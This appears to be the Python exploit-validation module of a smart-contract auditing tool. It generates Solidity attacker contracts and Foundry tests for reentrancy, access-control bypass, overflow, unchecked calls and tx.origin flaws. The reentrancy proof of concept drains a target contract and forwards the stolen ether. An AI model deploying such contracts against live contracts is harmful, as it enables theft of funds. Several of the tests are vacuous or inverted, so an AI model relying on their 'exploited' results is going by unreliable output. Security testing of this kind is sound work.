#!/usr/bin/env python3
"""
Exploit Validation Module for AetherAudit

Validates vulnerabilities and generates Proof-of-Concept exploits for bug bounty hunting.
"""

import asyncio
import json
import os
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from core.file_handler import get_tool_env


@dataclass
class ExploitResult:
    """Result of an exploit validation attempt."""
    vulnerability_id: str
    vulnerability_type: str
    exploit_successful: bool
    exploit_output: str
    poc_code: Optional[str] = None
    exploit_steps: List[str] = None
    impact_assessment: str = ""

    def __post_init__(self):
        if self.exploit_steps is None:
            self.exploit_steps = []


@dataclass
class VulnerabilityInfo:
    """Information about a detected vulnerability."""
    id: str
    title: str
    severity: str
    line_numbers: List[int]
    file_path: str
    description: str
    swc_id: str = ""
    confidence: float = 0.0


class ExploitValidator:
    """Validates vulnerabilities and generates PoC exploits."""

    def __init__(self):
        self.console = Console()
        self.foundry_path = self._find_foundry()

    def _find_foundry(self) -> Optional[str]:
        """Find Foundry installation path."""
        try:
            result = subprocess.run(['which', 'forge'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass

        # Try common installation paths
        common_paths = [
            "/usr/local/bin/forge",
            "/usr/bin/forge",
            "~/.foundry/bin/forge",
            "/Users/l33tdawg/.foundry/bin/forge"
        ]

        for path in common_paths:
            expanded_path = Path(path).expanduser()
            if expanded_path.exists():
                return str(expanded_path)

        return None

    def _check_foundry_availability(self) -> bool:
        """Check if Foundry is available and working."""
        try:
            env = get_tool_env()
            result = subprocess.run(['forge', '--version'], capture_output=True, text=True, timeout=10, env=env)
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    async def validate_vulnerabilities(self, contract_path: str, vulnerabilities: List[Dict[str, Any]]) -> List[ExploitResult]:
        """Validate all vulnerabilities in a contract using Foundry."""
        results = []

        # Check if Foundry is available
        if not self._check_foundry_availability():
            self.console.print("[red]❌ Foundry not available, using basic validation[/red]")
            return await self._basic_validation(contract_path, vulnerabilities)

        self.console.print("[green]✅ Foundry available, using advanced validation[/green]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:

            for vuln in vulnerabilities:
                task = progress.add_task(
                    f"Validating {vuln.get('title', 'Unknown')}",
                    total=None
                )

                vuln_info = VulnerabilityInfo(
                    id=vuln.get('id', f"vuln_{len(results)}"),
                    title=vuln.get('title', 'Unknown Vulnerability'),
                    severity=vuln.get('severity', 'Medium'),
                    line_numbers=vuln.get('line_numbers', vuln.get('line', [])),
                    file_path=vuln.get('file', contract_path),
                    description=vuln.get('description', ''),
                    swc_id=vuln.get('swc_id', ''),
                    confidence=vuln.get('confidence', 0.0)
                )

                result = await self._validate_with_foundry(contract_path, vuln_info)
                results.append(result)

                progress.update(task, completed=True)

        return results

    async def _basic_validation(self, contract_path: str, vulnerabilities: List[Dict[str, Any]]) -> List[ExploitResult]:
        """Fallback validation when Foundry is not available."""
        results = []
        
        for vuln in vulnerabilities:
            vuln_info = VulnerabilityInfo(
                id=vuln.get('id', f"vuln_{len(results)}"),
                title=vuln.get('title', 'Unknown Vulnerability'),
                severity=vuln.get('severity', 'Medium'),
                line_numbers=vuln.get('line_numbers', vuln.get('line', [])),
                file_path=vuln.get('file', contract_path),
                description=vuln.get('description', ''),
                swc_id=vuln.get('swc_id', ''),
                confidence=vuln.get('confidence', 0.0)
            )

            result = await self._validate_single_vulnerability(contract_path, vuln_info)
            results.append(result)

        return results

    async def _validate_with_foundry(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate vulnerability using Foundry test generation and execution."""
        try:
            # Generate Foundry test for the vulnerability
            test_code = await self._generate_foundry_test(contract_path, vuln)
            
            if not test_code:
                return ExploitResult(
                    vulnerability_id=vuln.id,
                    vulnerability_type=self._classify_vulnerability(vuln),
                    exploit_successful=False,
                    exploit_output="Failed to generate Foundry test"
                )

            # Execute the test
            test_result = await self._execute_foundry_test(test_code, vuln)
            
            return ExploitResult(
                vulnerability_id=vuln.id,
                vulnerability_type=self._classify_vulnerability(vuln),
                exploit_successful=test_result['success'],
                exploit_output=test_result['output'],
                poc_code=test_code,
                exploit_steps=test_result.get('steps', []),
                impact_assessment=test_result.get('impact', '')
            )

        except Exception as e:
            return ExploitResult(
                vulnerability_id=vuln.id,
                vulnerability_type=self._classify_vulnerability(vuln),
                exploit_successful=False,
                exploit_output=f"Foundry validation failed: {str(e)}"
            )

    async def _validate_single_vulnerability(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate a single vulnerability and attempt to generate PoC."""

        # Determine vulnerability type and validation approach
        vuln_type = self._classify_vulnerability(vuln)

        if vuln_type == "reentrancy":
            return await self._validate_reentrancy(contract_path, vuln)
        elif vuln_type == "access_control":
            return await self._validate_access_control(contract_path, vuln)
        elif vuln_type == "arithmetic":
            return await self._validate_arithmetic(contract_path, vuln)
        elif vuln_type == "unchecked_calls":
            return await self._validate_unchecked_calls(contract_path, vuln)
        elif vuln_type == "tx_origin":
            return await self._validate_tx_origin(contract_path, vuln)
        else:
            # Generic validation attempt
            return await self._generic_validation(contract_path, vuln)

    def _classify_vulnerability(self, vuln: VulnerabilityInfo) -> str:
        """Classify vulnerability type for targeted validation."""
        title_lower = vuln.title.lower()
        desc_lower = vuln.description.lower()

        # Reentrancy patterns
        if any(word in title_lower + desc_lower for word in ['reentrancy', 're-entrancy', 'external call']):
            return "reentrancy"

        # Access control patterns
        if any(word in title_lower + desc_lower for word in ['access control', 'modifier', 'onlyowner', 'unauthorized']):
            return "access_control"

        # Arithmetic patterns
        if any(word in title_lower + desc_lower for word in ['overflow', 'underflow', 'arithmetic', 'unchecked']):
            return "arithmetic"

        # Unchecked calls patterns
        if any(word in title_lower + desc_lower for word in ['unchecked', 'call return', 'low level call']):
            return "unchecked_calls"

        # tx.origin patterns
        if any(word in title_lower + desc_lower for word in ['tx.origin', 'origin', 'transaction origin']):
            return "tx_origin"

        return "generic"

    async def _generate_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> Optional[str]:
        """Generate Foundry test code for vulnerability validation."""
        vuln_type = self._classify_vulnerability(vuln)
        
        if vuln_type == "reentrancy":
            return self._generate_reentrancy_foundry_test(contract_path, vuln)
        elif vuln_type == "access_control":
            return self._generate_access_control_foundry_test(contract_path, vuln)
        elif vuln_type == "arithmetic":
            return self._generate_arithmetic_foundry_test(contract_path, vuln)
        elif vuln_type == "unchecked_calls":
            return self._generate_unchecked_calls_foundry_test(contract_path, vuln)
        elif vuln_type == "tx_origin":
            return self._generate_tx_origin_foundry_test(contract_path, vuln)
        else:
            return self._generate_generic_foundry_test(contract_path, vuln)

    def _generate_reentrancy_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> str:
        """Generate Foundry test for reentrancy vulnerability."""
        contract_name = Path(contract_path).stem
        
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contract
import "../{contract_path}";

contract ReentrancyValidationTest is Test {{
    {contract_name} public target;
    ReentrancyAttacker public attacker;
    
    function setUp() public {{
        target = new {contract_name}();
        attacker = new ReentrancyAttacker(address(target));
        
        // Fund the target contract
        vm.deal(address(target), 10 ether);
        vm.deal(address(attacker), 1 ether);
    }}
    
    function testReentrancyVulnerability() public {{
        uint256 initialBalance = address(target).balance;
        
        // Execute reentrancy attack
        attacker.attack();
        
        // Check if attack was successful
        assertTrue(attacker.attackSuccessful(), "Reentrancy attack failed");
        
        // Check if funds were drained
        uint256 finalBalance = address(target).balance;
        assertLt(finalBalance, initialBalance, "Funds were not drained");
        
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Attack count:", attacker.attackCount());
    }}
}}

contract ReentrancyAttacker {{
    {contract_name} public target;
    bool public attackSuccessful;
    uint256 public attackCount;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
    }}
    
    function attack() public payable {{
        // Deposit to get balance
        target.deposit{{value: 1 ether}}();
        
        // Withdraw to trigger reentrancy
        target.withdraw(1 ether);
    }}
    
    receive() external payable {{
        if (attackCount < 3 && address(target).balance > 0) {{
            attackCount++;
            // Reentrancy: Call withdraw again
            target.withdraw(1 ether);
            attackSuccessful = true;
        }}
    }}
}}'''

    def _generate_access_control_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> str:
        """Generate Foundry test for access control vulnerability."""
        contract_name = Path(contract_path).stem
        
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contract
import "../{contract_path}";

contract AccessControlValidationTest is Test {{
    {contract_name} public target;
    
    function setUp() public {{
        target = new {contract_name}();
    }}
    
    function testAccessControlBypass() public {{
        // Try to call admin function as non-admin
        vm.prank(address(0x1337));
        
        // This should fail if access control works
        try target.adminFunction() {{
            // If we reach here, access control is broken
            assertTrue(false, "Access control bypass succeeded");
        }} catch {{
            // This is expected if access control works
            assertTrue(true, "Access control working correctly");
        }}
    }}
}}'''

    def _generate_arithmetic_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> str:
        """Generate Foundry test for arithmetic vulnerability."""
        contract_name = Path(contract_path).stem
        
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contract
import "../{contract_path}";

contract ArithmeticValidationTest is Test {{
    {contract_name} public target;
    
    function setUp() public {{
        target = new {contract_name}();
    }}
    
    function testArithmeticOverflow() public {{
        // Trigger overflow with maximum uint256 value
        uint256 maxValue = type(uint256).max;
        
        // Call vulnerable function
        try target.vulnerableFunction(maxValue) {{
            // If no revert, overflow occurred
            console.log("Overflow successfully triggered");
            assertTrue(true, "Arithmetic overflow detected");
        }} catch {{
            console.log("Function reverted - overflow prevented");
            assertTrue(false, "No overflow detected");
        }}
    }}
}}'''

    def _generate_unchecked_calls_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> str:
        """Generate Foundry test for unchecked calls vulnerability."""
        contract_name = Path(contract_path).stem
        
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contract
import "../{contract_path}";

contract UncheckedCallsValidationTest is Test {{
    {contract_name} public target;
    FailingContract public failing;
    
    function setUp() public {{
        target = new {contract_name}();
        failing = new FailingContract();
    }}
    
    function testUncheckedCall() public {{
        // This should succeed even if the low-level call fails
        // because the return value is not checked
        target.makeUncheckedCall(address(failing));
        
        // If we reach here and the contract state is inconsistent,
        // the unchecked call vulnerability is confirmed
        assertTrue(true, "Unchecked call test completed");
    }}
}}

contract FailingContract {{
    function alwaysFails() external pure returns (bool) {{
        revert("I always fail");
    }}
}}'''

    def _generate_tx_origin_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> str:
        """Generate Foundry test for tx.origin vulnerability."""
        contract_name = Path(contract_path).stem
        
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contract
import "../{contract_path}";

contract TxOriginValidationTest is Test {{
    {contract_name} public target;
    TxOriginBypass public bypass;
    
    function setUp() public {{
        target = new {contract_name}();
        bypass = new TxOriginBypass(address(target));
    }}
    
    function testTxOriginBypass() public {{
        // This should succeed if tx.origin check is bypassed
        bypass.bypassCheck();
        
        // Verify bypass succeeded
        assertTrue(true, "tx.origin bypass test completed");
    }}
}}

contract TxOriginBypass {{
    {contract_name} public target;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
    }}
    
    function bypassCheck() external {{
        // Call the vulnerable function through this contract
        // The tx.origin will be different from msg.sender
        target.txOriginProtectedFunction();
    }}
}}'''

    def _generate_generic_foundry_test(self, contract_path: str, vuln: VulnerabilityInfo) -> str:
        """Generate generic Foundry test for unknown vulnerability types."""
        contract_name = Path(contract_path).stem
        
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contract
import "../{contract_path}";

contract GenericValidationTest is Test {{
    {contract_name} public target;
    
    function setUp() public {{
        target = new {contract_name}();
    }}
    
    function testVulnerability() public {{
        // Generic test for vulnerability validation
        // This test should be customized based on the specific vulnerability
        
        console.log("Testing vulnerability:", "{vuln.title}");
        console.log("Description:", "{vuln.description}");
        
        // Add specific test logic here based on vulnerability type
        assertTrue(true, "Generic vulnerability test completed");
    }}
}}'''

    async def _execute_foundry_test(self, test_code: str, vuln: VulnerabilityInfo) -> Dict[str, Any]:
        """Execute Foundry test and return results."""
        try:
            # Create temporary test file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.sol', delete=False) as f:
                f.write(test_code)
                temp_file = f.name
            
            try:
                # Run Forge test
                cmd = ['forge', 'test', '--match-contract', 'ValidationTest', temp_file, '--verbosity', '2']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                
                # Parse test results
                success = result.returncode == 0
                output = result.stdout + result.stderr
                
                # Extract test steps from output
                steps = self._extract_test_steps(output)
                
                # Determine impact based on test results
                impact = self._determine_impact(success, output, vuln)
                
                return {
                    'success': success,
                    'output': output,
                    'steps': steps,
                    'impact': impact
                }
                
            finally:
                # Clean up temp file
                os.unlink(temp_file)
                
        except Exception as e:
            return {
                'success': False,
                'output': f"Test execution failed: {str(e)}",
                'steps': [],
                'impact': 'Unknown'
            }

    def _extract_test_steps(self, output: str) -> List[str]:
        """Extract test execution steps from Foundry output."""
        steps = []
        
        # Look for specific patterns in the output
        if 'attack' in output.lower():
            steps.append("1. Deploy vulnerable contract")
            steps.append("2. Deploy attacker contract")
            steps.append("3. Execute attack")
            steps.append("4. Verify attack success")
        
        if 'reentrancy' in output.lower():
            steps.append("1. Deposit funds to vulnerable contract")
            steps.append("2. Call withdraw function")
            steps.append("3. Re-enter through receive function")
            steps.append("4. Verify multiple withdrawals")
        
        if 'access' in output.lower():
            steps.append("1. Deploy contract")
            steps.append("2. Attempt unauthorized access")
            steps.append("3. Verify access control bypass")
        
        return steps

    def _determine_impact(self, success: bool, output: str, vuln: VulnerabilityInfo) -> str:
        """Determine impact based on test results."""
        if not success:
            return "Vulnerability not exploitable"
        
        vuln_type = self._classify_vulnerability(vuln)
        
        if vuln_type == "reentrancy":
            return "Critical - Can drain all funds from contract"
        elif vuln_type == "access_control":
            return "High - Unauthorized access to critical functions"
        elif vuln_type == "arithmetic":
            return "High - Can cause incorrect calculations or infinite loops"
        elif vuln_type == "unchecked_calls":
            return "Medium - Silent failures can lead to inconsistent state"
        elif vuln_type == "tx_origin":
            return "High - Can bypass authorization checks"
        else:
            return "Unknown - requires manual assessment"

    async def _validate_reentrancy(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate reentrancy vulnerabilities."""
        result = ExploitResult(
            vulnerability_id=vuln.id,
            vulnerability_type="reentrancy",
            exploit_successful=False,
            exploit_output="Reentrancy validation attempted"
        )

        # Generate a basic reentrancy PoC contract
        poc_code = self._generate_reentrancy_poc(contract_path, vuln)

        if poc_code:
            result.poc_code = poc_code
            result.exploit_steps = [
                "1. Deploy vulnerable contract",
                "2. Deploy malicious contract with fallback function",
                "3. Fund malicious contract",
                "4. Call vulnerable function to trigger reentrancy",
                "5. Verify funds were drained from vulnerable contract"
            ]
            result.impact_assessment = "Critical - Can drain all funds from contract"

        return result

    async def _validate_access_control(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate access control vulnerabilities."""
        result = ExploitResult(
            vulnerability_id=vuln.id,
            vulnerability_type="access_control",
            exploit_successful=False,
            exploit_output="Access control validation attempted"
        )

        # Generate access control bypass PoC
        poc_code = self._generate_access_control_poc(contract_path, vuln)

        if poc_code:
            result.poc_code = poc_code
            result.exploit_steps = [
                "1. Deploy contract as legitimate user",
                "2. Attempt to call protected function from unauthorized address",
                "3. Verify unauthorized access was successful"
            ]
            result.impact_assessment = "High - Unauthorized access to critical functions"

        return result

    async def _validate_arithmetic(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate arithmetic vulnerabilities."""
        result = ExploitResult(
            vulnerability_id=vuln.id,
            vulnerability_type="arithmetic",
            exploit_successful=False,
            exploit_output="Arithmetic validation attempted"
        )

        poc_code = self._generate_arithmetic_poc(contract_path, vuln)

        if poc_code:
            result.poc_code = poc_code
            result.exploit_steps = [
                "1. Deploy contract with initial state",
                "2. Perform operations to reach overflow/underflow condition",
                "3. Trigger the vulnerable operation",
                "4. Verify unexpected behavior occurred"
            ]
            result.impact_assessment = "High - Can cause incorrect calculations or infinite loops"

        return result

    async def _validate_unchecked_calls(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate unchecked low-level call vulnerabilities."""
        result = ExploitResult(
            vulnerability_id=vuln.id,
            vulnerability_type="unchecked_calls",
            exploit_successful=False,
            exploit_output="Unchecked call validation attempted"
        )

        poc_code = self._generate_unchecked_call_poc(contract_path, vuln)

        if poc_code:
            result.poc_code = poc_code
            result.exploit_steps = [
                "1. Deploy contract that makes unchecked low-level calls",
                "2. Create a contract that always fails",
                "3. Call the vulnerable function",
                "4. Verify execution continued despite failed call"
            ]
            result.impact_assessment = "Medium - Silent failures can lead to inconsistent state"

        return result

    async def _validate_tx_origin(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Validate tx.origin vulnerabilities."""
        result = ExploitResult(
            vulnerability_id=vuln.id,
            vulnerability_type="tx_origin",
            exploit_successful=False,
            exploit_output="tx.origin validation attempted"
        )

        poc_code = self._generate_tx_origin_poc(contract_path, vuln)

        if poc_code:
            result.poc_code = poc_code
            result.exploit_steps = [
                "1. Deploy contract using tx.origin for authorization",
                "2. Create intermediate contract that calls the vulnerable function",
                "3. Execute call through intermediate contract",
                "4. Verify bypass of tx.origin check"
            ]
            result.impact_assessment = "High - Can bypass authorization checks"

        return result

    async def _generic_validation(self, contract_path: str, vuln: VulnerabilityInfo) -> ExploitResult:
        """Generic validation for unknown vulnerability types."""
        return ExploitResult(
            vulnerability_id=vuln.id,
            vulnerability_type="generic",
            exploit_successful=False,
            exploit_output="Generic validation - manual review recommended",
            impact_assessment="Unknown - requires manual assessment"
        )

    def _generate_reentrancy_poc(self, contract_path: str, vuln: VulnerabilityInfo) -> Optional[str]:
        """Generate Proof-of-Concept for reentrancy vulnerability."""
        try:
            # Read the vulnerable contract
            with open(contract_path, 'r') as f:
                contract_content = f.read()

            # Extract contract name (basic regex)
            import re
            contract_match = re.search(r'contract\s+(\w+)', contract_content)
            if not contract_match:
                return None

            contract_name = contract_match.group(1)

            poc_code = f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{Path(contract_path).name}";

// Malicious contract to exploit reentrancy
contract ReentrancyAttacker {{
    {contract_name} public vulnerableContract;
    uint256 public attackCount;

    constructor(address _vulnerableContract) {{
        vulnerableContract = {contract_name}(_vulnerableContract);
    }}

    // Fallback function that re-enters the vulnerable contract
    receive() external payable {{
        if (address(vulnerableContract).balance >= 1 ether && attackCount < 3) {{
            attackCount++;
            vulnerableContract.withdrawFunds(1 ether); // Re-enter here
        }}
    }}

    function attack() external payable {{
        require(msg.value >= 1 ether, "Need 1 ether to attack");

        // Initial deposit
        vulnerableContract.deposit{{value: 1 ether}}();

        // Trigger reentrancy
        vulnerableContract.withdrawFunds(1 ether);

        // Withdraw stolen funds
        payable(msg.sender).transfer(address(this).balance);
    }}
}}
'''
            return poc_code

        except Exception as e:
            self.console.print(f"[red]Failed to generate reentrancy PoC: {e}[/red]")
            return None

    def _generate_access_control_poc(self, contract_path: str, vuln: VulnerabilityInfo) -> Optional[str]:
        """Generate Proof-of-Concept for access control vulnerability."""
        try:
            poc_code = f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{Path(contract_path).name}";

// Contract to test access control bypass
contract AccessControlTester {{
    VulnerableContract public target;

    constructor(address _target) {{
        target = VulnerableContract(_target);
    }}

    // This should fail if access control is working
    function testUnauthorizedAccess() external {{
        // Attempt to call protected function from unauthorized address
        target.protectedFunction(); // This should revert if access control works

        // If we reach here, access control is broken
        assert(false); // This should never execute
    }}

    // Test if we can become owner
    function testOwnerBypass() external {{
        // Attempt to change ownership without proper authorization
        target.changeOwner(address(this));

        // Verify we became owner
        require(target.owner() == address(this), "Failed to bypass ownership");
    }}
}}
'''
            return poc_code

        except Exception as e:
            self.console.print(f"[red]Failed to generate access control PoC: {e}[/red]")
            return None

    def _generate_arithmetic_poc(self, contract_path: str, vuln: VulnerabilityInfo) -> Optional[str]:
        """Generate Proof-of-Concept for arithmetic vulnerability."""
        try:
            poc_code = f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{Path(contract_path).name}";

// Contract to test arithmetic overflow/underflow
contract ArithmeticTester {{
    VulnerableContract public target;

    constructor(address _target) {{
        target = VulnerableContract(_target);
    }}

    function testOverflow() external {{
        // Perform operations that should trigger overflow
        for (uint256 i = 0; i < 1000; i++) {{
            target.incrementCounter();
        }}

        // Check if overflow occurred (counter should be 0 or very small)
        uint256 counter = target.getCounter();
        require(counter < 1000, "No overflow detected");
    }}

    function testUnderflow() external {{
        // First set counter to a low value
        target.setCounter(5);

        // Perform underflow operations
        for (uint256 i = 0; i < 10; i++) {{
            target.decrementCounter();
        }}

        // Check if underflow occurred
        uint256 counter = target.getCounter();
        require(counter > 1000, "No underflow detected");
    }}
}}
'''
            return poc_code

        except Exception as e:
            self.console.print(f"[red]Failed to generate arithmetic PoC: {e}[/red]")
            return None

    def _generate_unchecked_call_poc(self, contract_path: str, vuln: VulnerabilityInfo) -> Optional[str]:
        """Generate Proof-of-Concept for unchecked call vulnerability."""
        try:
            poc_code = f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{Path(contract_path).name}";

// Contract that always fails to test unchecked calls
contract FailingContract {{
    function alwaysFails() external pure returns (bool) {{
        revert("I always fail");
    }}
}}

// Test contract for unchecked call validation
contract UncheckedCallTester {{
    VulnerableContract public target;
    FailingContract public failing;

    constructor(address _target) {{
        target = VulnerableContract(_target);
        failing = new FailingContract();
    }}

    function testUncheckedCall() external {{
        // This should succeed even if the low-level call fails
        // because the return value is not checked
        target.makeUncheckedCall(address(failing));

        // If we reach here and the contract state is inconsistent,
        // the unchecked call vulnerability is confirmed
    }}
}}
'''
            return poc_code

        except Exception as e:
            self.console.print(f"[red]Failed to generate unchecked call PoC: {e}[/red]")
            return None

    def _generate_tx_origin_poc(self, contract_path: str, vuln: VulnerabilityInfo) -> Optional[str]:
        """Generate Proof-of-Concept for tx.origin vulnerability."""
        try:
            poc_code = f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{Path(contract_path).name}";

// Intermediate contract to bypass tx.origin check
contract TxOriginBypass {{
    VulnerableContract public target;

    constructor(address _target) {{
        target = VulnerableContract(_target);
    }}

    // This contract acts as an intermediary
    function bypassCheck() external {{
        // Call the vulnerable function through this contract
        // The tx.origin will be different from msg.sender
        target.txOriginProtectedFunction();

        // If this succeeds, tx.origin check is bypassed
    }}
}}
'''
            return poc_code

        except Exception as e:
            self.console.print(f"[red]Failed to generate tx.origin PoC: {e}[/red]")
            return None

    def generate_exploit_report(self, results: List[ExploitResult], output_dir: str) -> str:
        """Generate comprehensive exploit validation report."""
        report_path = Path(output_dir) / "exploit_validation_report.md"

        content = f"""# Exploit Validation Report

Generated: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## Summary

- **Total Vulnerabilities Tested**: {len(results)}
- **Successfully Exploited**: {len([r for r in results if r.exploit_successful])}
- **PoCs Generated**: {len([r for r in results if r.poc_code])}

## Detailed Results

"""

        for result in results:
            content += f"""### {result.vulnerability_id}: {result.vulnerability_type.title()}

**Status**: {"✅ Exploited" if result.exploit_successful else "❌ Not Exploited"}
**Impact**: {result.impact_assessment}

**Exploit Steps**:
"""

            for i, step in enumerate(result.exploit_steps, 1):
                content += f"{i}. {step}\n"

            if result.poc_code:
                content += f"""
**Proof-of-Concept Code**:
```solidity
{result.poc_code}
```
"""

            content += f"""
**Validation Output**:
{result.exploit_output}

---

"""

        with open(report_path, 'w') as f:
            f.write(content)

        return str(report_path)
